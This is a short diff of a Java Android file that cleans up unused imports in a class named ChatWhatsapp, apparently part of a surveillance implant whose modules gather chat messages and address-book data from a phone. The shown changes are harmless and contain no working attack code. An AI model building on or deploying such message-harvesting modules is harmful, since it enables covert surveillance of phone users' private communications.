@@ -5,9 +5,7 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Enumeration;
-import java.util.HashSet;
 import java.util.Hashtable;
-import java.util.Set;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -23,14 +21,10 @@ import android.database.sqlite.SQLiteQueryBuilder;
 import android.util.Pair;
 
 import com.android.networking.Messages;
-import com.android.networking.ProcessStatus;
 import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.db.RecordVisitor;
-import com.android.networking.evidence.Markup;
 import com.android.networking.file.Path;
-import com.android.networking.listener.ListenerProcess;
-import com.android.networking.manager.ManagerModule;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
@@ -88,6 +82,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		hastableConversationLastIndex = new Hashtable<String, Integer>();
 		try {
 			myPhoneNumber = readMyPhoneNumber();
+			
 			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
 				enabled = false;
 				return;
